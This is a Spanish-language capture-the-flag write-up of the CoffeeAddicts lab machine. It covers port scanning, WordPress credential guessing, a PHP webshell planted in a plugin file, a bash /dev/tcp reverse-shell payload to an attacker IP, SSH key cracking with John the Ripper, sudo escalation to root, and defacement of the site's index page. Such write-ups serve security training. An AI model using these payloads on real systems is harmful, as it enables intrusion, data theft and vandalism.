---
layout: post
title: CoffeeAddicts - Writeup
date: 2025-08-18
author:
  name: Suzunao
  avatar: /assets/img/icon/Suzunao.png
tags:
  - Linux
  - Vulnhub
background: https://i.pinimg.com/1200x/a9/c9/38/a9c9385efdc4db8d8884df92f9822769.jpg
---

Antes de iniciar, debemos identificar la dirección IP correspondiente a la máquina Coffee y, posteriormente, escanear sus puertos abiertos. Para ello, primero es necesario conocer la interfaz de red activa y la subred asignada, lo cual nos permitirá delimitar correctamente el rango de escaneo. Utilizamos el siguiente comando:

``` bash
route ip 
```

![Descripción](/assets/img/posts/cofeeaddicts/20250621200450.png)

El comando `ip route` nos permite visualizar la tabla de enrutamiento actual del sistema. A partir de esta salida, podemos identificar la interfaz de red activa y la subred asignada. Por ejemplo, si observamos la línea: 

``` bash
142.160.0.0/24 dev eth1 proto kernel scope link src 142.160.0.2 metric 100
```

Esto indica que la IP local es `142.160.0.2`, perteneciente a la red `142.160.0.0/24`, y se encuentra asociada a la interfaz `eth1`.
Una vez conocida la subred, utilizamos Nmap para identificar los dispositivos activos en ella:

``` bash 
sudo nmap -sn <IP/mascara>
```

- El parámetro `-sn` de Nmap permite realizar un escaneo de descubrimiento de hosts activos sin escanear puertos.

Una vez identificada la IP de la máquina Coffee (en este caso es la 142.160.0.7), se procederá con el escaneo detallado de sus puertos abiertos.

### Scan Port

Para identificar los puertos abiertos y los servicios que se están ejecutando en la máquina objetivo (en este caso, IP `142.160.0.7`), se empleó el siguiente comando:

``` bash
sudo nmap -sSVC -T4 -vvv 142.160.0.7 -oN Portscan.txt
```

- `-sSCV`: Este conjunto combina tres funcionalidades clave:
		`-sS`: SYN scan → Escaneo furtivo de puertos TCP.    
		`-sV`: Version detection → Detección de versiones de servicios.    
		`-sC`: Default scripts → Ejecución de los scripts NSE por defecto (los más comunes para enumeración básica).
- `-T4`: Establece la velocidad del escaneo. 
- `-vvv`: Aumenta el nivel de verbosidad, mostrando detalles en tiempo real durante el escaneo y más información en la salida final.
- `-oN Portscan.txt`: Guarda la salida en formato normal (`-oN`) en el archivo `Portscan.txt`.

Como resultado del escaneo, se identificaron los siguientes puertos abiertos en la máquina objetivo:

![Descripción](/assets/img/posts/cofeeaddicts/20250621203839.png)

``` bash 
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
```

Esto indica lo siguiente:

- **Puerto 22 (SSH)**: Existe un servicio de acceso remoto habilitado mediante OpenSSH 7.6p1, lo cual sugiere que es posible autenticar vía SSH si se dispone de credenciales válidas o se identifica una vulnerabilidad asociada a esa versión.
- **Puerto 80 (HTTP)**: Hay un servicio web activo utilizando Apache 2.4.29, el cual no está protegido con SSL/TLS, es decir, no utiliza HTTPS.
Al intentar acceder mediante navegador a través de la dirección IP, se presenta la siguiente página:

![descripcion](/assets/img/posts/cofeeaddicts/20250621204115.png)

Esto sugiere que el servidor espera que la solicitud HTTP incluya un nombre de dominio (virtual host) específico. Para resolver esta situación, agregamos una entrada personalizada en el archivo `/etc/hosts` para asociar el dominio con la IP objetivo.

```bash 
echo "142.160.0.7 coffeeaddicts.thm" | sudo tee -a /etc/hosts
```

- Este comando agrega una entrada que vincula la IP `142.160.0.7` con el nombre de dominio `coffeeaddicts.thm`, permitiendo que el navegador resuelva correctamente el sitio.
- Al hacerlo, ya es posible acceder correctamente al contenido del sitio web mediante la URL:

``` bash
http://coffeeaddicts.thm
```

![Descripción](/assets/img/posts/cofeeaddicts/20250621211500.png)

Con este paso completado, ya podemos inspeccionar y analizar la aplicación web en busca de rutas ocultas, formularios vulnerables o configuraciones inseguras.

### Enumeración

Para identificar rutas o directorios ocultos dentro del sitio web accesible en `http://coffeeaddicts.thm`, se utilizó la herramienta ffuf (Fuzz Faster U Fool), que permite realizar ataques de enumeración de rutas mediante diccionarios:

```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://coffeeaddicts.thm/FUZZ -ic 
```

- `-w`: Especifica el diccionario a utilizar, en este caso `common.txt` de DirB.
- `-u`: Define la URL con el marcador `FUZZ`, el cual será sustituido por cada palabra del diccionario.
- `-ic`: Ignora mayúsculas y minúsculas durante el análisis de las respuestas.

![Descripcion](/assets/img/posts/cofeeaddicts/20250621213452.png)

Como resultado se identificó la ruta `/wordpress`, lo cual indica la presencia de un sitio web construido con WordPress.
Al acceder a `http://coffeeaddicts.thm/wordpress`, se observan publicaciones y comentarios. En uno de ellos se menciona lo siguiente:

![Descripcion](/assets/img/posts/cofeeaddicts/20250622000646.png)

> _“Is that a password?”_  
> _“Maybe...”_

Este intercambio sugiere que la frase "gus i need you back" podría estar relacionada con una contraseña.
Aplicando un razonamiento básico, se infiere:
- Usuario posible: `gus`
- Contraseña probable (sin espacios): `gusineedyouback`
Entonces para probarlas se realiza una nueva búsqueda de rutas dentro del directorio `/wordpress` para identificar accesos administrativos o puntos de entrada adicionales:

``` bash 
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://coffeeaddicts.thm/wordpress/FUZZ -ic
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622001218.png)

Como resultado se descubre la ruta `/wp-login.php`, correspondiente al panel de autenticación de administradores de WordPress, se accede a `http://coffeeaddicts.thm/wordpress/wp-login.php` e ingresan las credenciales inferidas:

![Descripción](/assets/img/posts/cofeeaddicts/20250622001458.png)

Al parecer la autenticación  es exitosa, otorgando acceso al panel de administración de WordPress, lo que representa un punto crítico de acceso con posibilidades de escalar privilegios o ejecutar código en el servidor

![Descripción](/assets/img/posts/cofeeaddicts/20250622001608.png)

### Ejecución de código remoto  

Al examinar  el panel de administración de WordPress con el usuario `gus`,  este posee privilegios suficientes para editar archivos de plugins desde el propio panel. 
En particular,  es posible modificar el archivo `akismet.php`, correspondiente al plugin Akismet, ubicado en: `/wp-content/plugins/akismet/akismet.php`

Entonces con esto en cuenta aprovechamos esta funcionalidad para insertar un WebShell básico que permite la ejecución remota de comandos del sistema mediante parámetros en la URL:

``` php
<?php system($_GET['cmd']); ?>
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622010801.png)

Luego de inyectar el código acedemos a la siguiente URL, incorporando el parámetro `cmd=id`, con el objetivo de validar la ejecución:

``` bash 
http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php?cmd=id
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622010843.png)

Con esto  se confirma la ejecución exitosa de comandos en el sistema a través de la inyección en el archivo `akismet.php`.

Con la capacidad de ejecutar comandos a nivel del sistema, procedemos a establecer una reverse shell para obtener acceso interactivo al entorno del sistema operativo de la víctima, colocando el siguiente payload:

```
<?php
$ip = "10.10.x.x"; // <- cambiar por tu ip 
$port = "1234"; // <- Puerto
@system("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622014542.png)

Con esto cargado, colocamos nuestra maquina en escucha por el puerto 1234 : `nc -lvnp 1234`.
Acedemos a la URL para ejecutar el payload: `http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php` y en nuestra maquina obtendremos la reverse shell:

![Descripción](/assets/img/posts/cofeeaddicts/20250622014743.png)

### Escalada Privilegios  -> user

Una vez dentro del sistema con la sesión obtenida vía reverse shell, se accede al directorio `/home/gus`, donde se encuentra la flag de usuario junto a un archivo adicional llamado `readme.txt`. Al revisar el contenido del `readme.txt`, se puede observar el siguiente mensaje:

![Descripción](/assets/img/posts/cofeeaddicts/20250622023736.png)

El usuario `gus` fue eliminado del grupo sudoers, por lo que ha perdido la capacidad de ejecutar comandos como superusuario mediante `sudo`. Para identificar otros usuarios potencialmente relevantes, se ejecuta:

```
cat /etc/passwd | grep bash
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622024155.png)

Entre los resultados, se destaca el usuario **`badbyte`**, quien probablemente sea el responsable de los cambios mencionados en el `readme.txt`. Procedemos a enumerar el contenido del directorio personal de `badbyte`, así como de su subdirectorio oculto `.ssh`, donde suelen almacenarse claves SSH:

```
ls -a /home/badbyte/
ls -a /home/badbyte/.ssh
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622024957.png)

En este caso se descubre el archivo `id_rsa`, una clave privada SSH cifrada. Este archivo puede permitir el acceso remoto como `badbyte` si logramos descifrar su contraseña utilizando ssh2joh y john the ripper, la herramienta `John the Ripper` no puede usar directamente archivos `id_rsa`. Por ello, primero se convierte a un formato compatible utilizando el script `ssh2john.py`:

```
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
python3 ssh2john.py id_rsa > id_rsa.hash
```

Esto genera un archivo llamado `id_rsa.hash`, que contiene la representación de la clave en formato comprensible por John. Ejecutamos un ataque de diccionario utilizando la popular lista de contraseñas `rockyou.txt`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622030937.png)

Después de unos segundos, John logra descifrar la contraseña de la clave privada, revelando así la passphrase utilizada para proteger el archivo. Con la clave ya funcional, se puede establecer una sesión SSH interactiva como el usuario `badbyte`.

![Descripción](/assets/img/posts/cofeeaddicts/20250622031310.png)

### Escalada de privilegios -> root 

Una vez se ha obtenido acceso como el usuario `badbyte`,  buscaremos la forma para elevar privilegios al usuario `root`. Para verificar si `badbyte` posee permisos especiales mediante `sudo`, se ejecuta:

![Descripción](/assets/img/posts/cofeeaddicts/20250622033341.png)

`(root) /opt/BadByte/shell:` Indica que el usuario puede ejecutar el binario `/opt/BadByte/shell` como root. Si está configurado con la opción `NOPASSWD`, puede hacerlo sin introducir la contraseña.

Antes de ejecutarlo directamente, se inspeccionan los archivos presentes en el directorio `/opt/BadByte/`:

![Descripción](/assets/img/posts/cofeeaddicts/20250622033812.png)

Aquí encontramos el  `shell`  que es un compilado del archivo `shell.ccp`, este archivo  es un programa en C++ que actúa como una shell interactiva básica esta lee los comandos ingresados por el usuario y los ejecuta en el sistema utilizando la función `system()`. El código entra en un bucle infinito (`while(1)`), muestra un prompt (`BadByte #`), captura la entrada del usuario con `cin >> command`, la convierte a un formato compatible con C (`cstr`) y la ejecuta con `system(cstr)` 
Como el usuario `badbyte` tiene permisos para ejecutarlo como root (según `sudo -l`), cualquier comando que se pase a través de este programa se ejecutará con privilegios elevados. Con lo anterior en mente, se procede a ejecutar el binario:

``` bash
sudo /opt/BadByte/shell
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622035026.png)

El sistema muestra el prompt `"BadByte # "`, lo que indica que el programa está activo. Desde aquí, se puede ejecutar cualquier comando del sistema con privilegios elevados.

### (extra) Edición del  index.html

Una vez se obtiene acceso como root, se cuenta con privilegios suficientes para modificar los archivos del sitio web público sin inconvenientes.  Para comenzar localizar el archivo `index.html` que corresponde al sitio expuesto públicamente:

``` bash 
find / -name "index.html" 2>/dev/null
```

![Descripción](/assets/img/posts/cofeeaddicts/20250622035057.png)

como vemos el archivo debemos modificar se encuentra en `/var/www/coffeeaddicts.thm/public_html/` . Se accede al directorio donde reside el archivo para su edición:

![Descripción](/assets/img/posts/cofeeaddicts/20250622041149.png)

Antes de modificar el archivo, transfiere al servidor una imagen personalizada (`badbyte.png`) que se utilizará como logo en el index.html.

```
<h1 style=color:red;>YOUR WEBSITE HAS BEEN HACKED BY BadByte mf</h1> 
<img src="./badbyte.png">
```

modificamos estas dos lineas  uno con nuentro seudonimo y el otro con la imagen:

> si no se actualiza: `systemctl restart apache2` 

![Descripción](/assets/img/posts/cofeeaddicts/20250622041707.png)


### Flags 

``` bash
root@CoffeeAdicts:/# cat /home/gus/user.txt 
THM{s4v3_y0uR_Cr3d5_b0i}
root@CoffeeAdicts:/# cat /root/root.txt 
THM{im_the_shell_master}
root@CoffeeAdicts:/# 
```